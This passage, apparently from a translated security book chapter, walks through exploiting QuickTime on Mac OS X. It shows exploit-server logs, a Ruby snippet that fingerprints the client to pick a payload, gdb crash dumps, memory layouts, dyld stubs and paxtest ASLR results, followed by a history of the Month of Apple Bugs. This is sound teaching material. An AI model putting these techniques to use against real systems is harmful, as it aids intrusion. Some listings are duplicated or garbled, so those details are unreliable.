
# 第7 章 • 安全与操作系统

## qimersp_redux.rb 连接日志

```text
qimersp_redux.rb: Connection from localhost (127.0.0.1:59238)
qimersp_redux.rb: Request from Quicktime: 7.3 on Mac 10.5.1-IA32
qimersp_redux.rb: Building payload for ‘7.3-Mac 10.5.1-IA32’
qimersp_redux.rb: Return address: Oxdeadbeef, shellcode: 10 bytes.
qimersp_redux.rb: Payload: 315 bytes (padding=ooooooo=0x6f)
qimersp_redux.rb: Sent 748 bytes...
```

## Quicktime 接收响应并触发了问题

```
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: Oxdeadbeef
xdeadbeef in ??
(gdb) back
#0 Oxdeadbeef in ?? ()
#1 0x645a4145 in ?? ()
Cannot access memory at Oxdeadbeef
```

## 客户端平台指纹识别与版本控制代码

用于客户端平台指纹识别和版本控制的代码只是简单的扫描，它将值存储在数组中，并根据版本、架构和 Mac OS X 版本使用有意义的键对哈希值：

```ruby
qtver = request.scan(/User-Agent: QuickTime\/(.+)\n\\qtver=(.+);?cu=(.+);?os=(.+)\r\n/).flatten

target = Hash.new

target[:version] = qtver[0]
target[:arch] = qtver[1]
target[:os] = qtver[3]
```

负载（payload）的选择是根据此类信息自动进行的，允许不同场景的多个客户端连接并接收到它们的“dead beef”负载。顺便提一下，这通常是你在漏洞利用代码中应尽可能实现的功能。在漏洞利用中要求参数并不优雅，几乎总有一种方法可以通过某种程度的隐蔽性来自动化负载选择，就像在本例中一样，通过指纹识别。

## 使用调试负载时的寄存器状态

```
eax 0xffffeae6 -5402
ec 0x5 5
edx 0x0 0
ebx 0x11223344 287454020
esp 0xbffffd20 0xbffffd20
ebp 0xdefacedd 0xdefacedd
esi 0xbabebeef -1161940441
edi 0x313337666 825456230
eip 0xdeadbeef 0xdeadbeef
```

## 验证栈执行保护

让我们确认（在 Leopard 中，唯一的区别是内核消息格式）我们无法通过将 `EIP` 指向可能位于负载的栈地址来在栈上执行代码：

```
Program received EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0xbffffd12
0xbffffd12 in ??
(gdb) shell sudo dmesg | grep execution
Data/Stack execution not permitted: QuickTime Player [pid 19621] at virtual address 0xbffffd00, protections were read-write
```

它报告说我们地址所在的内存区域保护仅为读写，且进程接收到了 `KERN_PROTECTION_FAILURE`。如果在进行返回-to-libc 救助时不更改内存权限，它将无法正常工作。你可以在下方看到我们尝试继续执行的栈基地址上的指令：

```
(gdb) x/4i 0xbffff12
0xbffff12: int3
0xbffff13: int3
0xbffff14: int3
0xbffff15: int3
```

## 进程地址空间布局

可以使用 `vmap` 工具来获取进程地址空间的布局、其库、动态分配的内存、栈等。它提供了极其有用的信息，以及每个内存区域的结束地址、权限和类型。你可以在下方看到 `libSystem` 以及其他对象的位置：

```
_TEXT 91b32000-91c8d000 [138K] r-x/r-x SM=COW /usr/lib/libSystem.B.dylib
_TEXT 91939000-91a19000 [89K] r-x/r-x SM=COW /usr/lib/libobjc.A.dylib
_TEXT 8e000000-8efe2e00 [184K] r-x/r-wx SM=COW /usr/lib/lyld
_TEXT 00001000-000e6000 [61K] r-x/r-wx SM=COW /Applications/QuickTime Player.app/Contents/MacOS/QuickTime Player
_TEXT 95f40000-97b37b000 [812K] r-x/r-x SM=COW /usr/Library/Frameworks/AppKit.framework/Versions/C/AppKit
```

## dyld 存根

让我们引入“dyld 存根”的概念：它们是简单的占位符，包含指向特定库提供的函数所在地址的跳转指令。在其他地方，它被用于将符号绑定或“链接”到相应的库，该任务由 Mach OS X 动态链接器（`dyld`）在运行时执行。Mach-O 可执行文件在其加载命令中指定运行所需的库，`dyld` 在库路径中查找它们（通过 `DYLD_LIBRARY_PATH` 环境变量进行修改）。懒性绑定在需要符号时（例如在函数调用时）发生。

你可以看到一些函数的 dyld 存根示例，其中存根的名称始终以 `dyld_stub_` 为前缀：

```
0xa0a36c07 <dyld_stub_system> jump 0x1bbbf3a4 <system>
0xa0a36c0c <dyld_stub_time> jump 0x1b9f5fc <time>
0xa0a36c11 <dyld_stub_timegm> jump 0x1b97f84 <timegm>
0xa0a36c16 <dyld_stub_tzset> jump 0x1b723ea <tzset>
0xa0a36c07 <dyld_stub_system> jump 0x1bbbf3a4 <system>
0xa0a36c0c <dyld_stub_time> jump 0x1b9f5fc <time>
0xa0a36c11 <dyld_stub_timegm> jump 0x1b97f84 <timegm>
0xa0a36c16 <dyld_stub_tzset> jump 0x1b723ea <tzset>
0xa0a36c07 <dyld_stub_system> jump 0x1bbbf3a4 <system>
0xa0a36c0c <dyld_stub_time> jump 0x1b9f5fc <time>
0xa0a36c11 <dyld_stub_timegm> jump 0x1b97f84 <timegm>
0xa0a36c16 <dyld_stub_tzset> jump 0x1b723ea <tzset>
0xa0a36c07 <dyld_stub_system> jump 0x1bbbf3a4 <system>
0xa0a36c0c <dyld_stub_time> jump 0x1b9f5fc <time>
0xa0a36c11 <dyld_stub_timegm> jump 0x1b97f84 <timegm>
0xa0a36c16 <dyld_stub_tzset> jump 0x1b723ea <tzset>
0xa0a36c07 <dyld_stub_system> jump 0x1bbbf3a4 <system>
0xa0a36c0c <dyld_stub_time> jump 0x1b9f5fc <time>
0xa0a36c11 <dyld_stub_timegm> jump 0x1b97f84 <timegm>
0xa0a36c16 <dyld_stub_tzset> jump 0x1b723ea <tzset>
```

*(注：由于原文文本中 dyld stubs 部分似乎存在重复，此处已按原文逻辑呈现，若原文存在排版错误请以实际为准)*

## Leopard 与地址布局随机化（ASLR）

地址布局随机化（ASLR）的概念最早由 PaX 项目引入 Linux，可能是多年入侵防御领域最具技术性且复杂的进展。

(参见 <http://pax.grsecurity.net/docs/aslr.txt>.)

其基础在于没有 ASLR 的系统会在固定位置生成动态库，包括其栈和堆地址（这可能取决于系统的实现和 malloc 的设计）。

具有 ASLR 的系统将这些地址尽可能地不可预测，通常是在执行时间（尽管微软决定在重启时随机化库地址，Apple 在 Leopard 中的实现与之类似）。因此，这将导致常见的利用技术在可靠性和速度方面失效，对于大多数场景（例如，重新启动的网络守护将受到暴力破解攻击）。

正如往常，伟大的想法是有代价的。ASLR 会带来性能损耗，是否明显取决于运行架构以及实现的优化程度和复杂性。大部分开销可能会发生在执行时间和内存分配上（如果后者是随机化的话）。另一个问题是 ABI 编译：依赖固定内存位置的后兼容软件在引入 ASLR 后可能会崩溃（例如，内核态代码使用了固定内存地址）。

下方输出显示了在 X86 上最新的（本文当时的）Mac OS X 10.4 安装程序上运行 `pastext` 工具的结果：

```
可执行的共享库数据 (mprotect) : 漏洞
可执行的栈 (mprotect) : 漏洞
匿名随机映射测试 : 无随机化
堆随机化测试 (ET EXEC) : 无随机化
主可执行文件随机化 (ET EXEC) : 无随机化
共享库随机化测试 : 无随机化
栈随机化测试 (SEGMEMEC) : 无随机化
栈随机化测试 (PAGEEXEC) : 无随机化
返回函数 (strcpy) : paxtest: 返回地址包含一个 NULL 字节。
返回函数 (strcpy, RANDEX) : paxtest: 返回地址包含一个 NULL 字节。
返回函数 (memcpy) : 已杀死 (Killed)
返回函数 (memcpy, RANDEX) : 已杀死 (Killed)
可执行共享库 bss : 漏洞
可执行的共享库数据 : 已杀死 (Killed)
可写文本段 : 漏洞
```

堆和栈缺乏随机化这一点再次显而易见，而且 `paxtest` 共享库随机化测试的性质并不能确定其存在（它期望在执行时进行随机化，而 Leopard 是以重启为基础执行此操作）。整个内存保护测试表明，Leopard 在强制内存权限方面并没有做得更好。

Leopard 中实现的 ASLR 在某种程度上可能更好地防御自动化攻击，但仍然存在严重问题，使得所谓的针对攻击和复杂威胁极有可能成功。此外，重新生成守护进程、内存泄漏和其他问题将很容易被滥用，因为随机化水平显然未达到优化的。

在运行最新修订版 Linux 2.6 内核的 x86_64 系统上，PaX 的结果显示了如果他们决定修复并实施一致的 ASLR，我们未来对 Mac OS X 应该期待什么：

- 匿名映射随机化测试 : 33 位（猜测）
- 堆随机化测试 (ET EXEC) : 13 位（猜测）
- 堆随机化测试 (ET DYN) : 13 位（猜测）
- 主可执行文件随机化 (ET EXEC) : 33 位（猜测）
- 主可执行文件随机化 (ET DYN) : 33 位（猜测）
- 共享库随机化测试 : 33 位（猜测）
- 栈随机化测试 (SEGMEMEC) : 40 位（猜测）
- 栈随机化测试 (PAGEEXEC) : 40 位（猜测）

# 苹果漏洞之月

如果说有一个所谓的“漏洞之月”引发了超出原始明显水平之外的争议（HD Moore 等人提出的“浏览器漏洞之月”），那就是“苹果漏洞之月（Month of Apple Bugs，简称 MoAB）”。这是 Kevin Finisterre 和 Lance M. Havok（此前被称为“LMH”）发起的项目，他们联手在 2007 年 1 月期间每天发布一个 Mac OS X 和 Apple 安全漏洞。

（见 <http://projects.full-pull.com/moab/>）
（见 <http://news.bbc.co.uk/2/hi/technology/6227875.sm>）
（见 <http://apple.slashdot.org/article.php?id=07/01/02/1336261.>）

该项目共产生了 30 处安全漏洞，其中许多对 Mac OS X 系统构成了远程和本地的关键威胁。从基于栈的缓冲区溢出，到脚本使用不当导致可利用的权限提升条件，再到内核堆溢出、文件格式解析缺陷和其他问题。即使是最流行的 Mac OS X 应用也暴露在风险之中，引发了用户群的强烈反应。

## 对厂商的压力及影响

通过该项目观察 Apple 的反应，其一贯的哲学是避免任何公开的回应或声明，无论是公开反驳还是承认漏洞。考虑到这种情况以及他们之前在发布安全问题方面几乎极少的记录，这是可以预见到的。包括微软在内的其他几个厂商在 20 世纪 90 年代也有类似或更糟糕的政策。

此外，MoAB 对 Mac 用户群带有一种嘲讽和幽默，尽管对他们的技术工作和贡献没有产生实际影响。将他们的行为视为幽默还是无意义的玩笑，仍然是一个个人品味问题。个人认为，与 Dave Ariel 对总是搞笑有趣的 GOBBLES 所说的类似，安全行业是一个需要严肃对待的行业。毕竟，它只是 IT 行业中一个非常小的子集。

在一些技术和安全漏洞的写作中，我们可以发现充斥着嘲讽和笑话，提到了安全行业的人、厂商和其他实体（历史人物、北美民间传说、记者等）。某些内容似乎是因为第三方对该项目的回应或攻击或其他冲突而产生的。这并不是秘密，这类项目可能会引起动乱、敌意，以及对发起者产生潜在的嫉妒情绪，因为他们将聚集大量的媒体和新闻关注。

> “凡是耗尽一生而未成名的人，在世界上留下的痕迹，正如空气中的烟或水面上的泡沫。” —— 丁丁·阿尔利格里，《神曲》第 24 歌，第 47–51 行。

1 月 31 日发布的最后一条说明包含一个超文本标记语言（HTML）注释，嘲讽了缺乏最后的嘲讽：

```html
<!-- No taunts for this time -->
```

其他的嘲讽包括以隐藏图像和其他对象形式存在的“额外漏洞”，这些对象会导致拒绝服务（DoS）（例如对 JP2 图像文件的内部结构进行无限循环），导致 Safari 崩溃。

```html
<img src="files/heat-up.jpg" alt="" height="1" />
```

```html
<!-- 在床上浏览 MoAB 时切勿使用笔记本电脑 -->
```
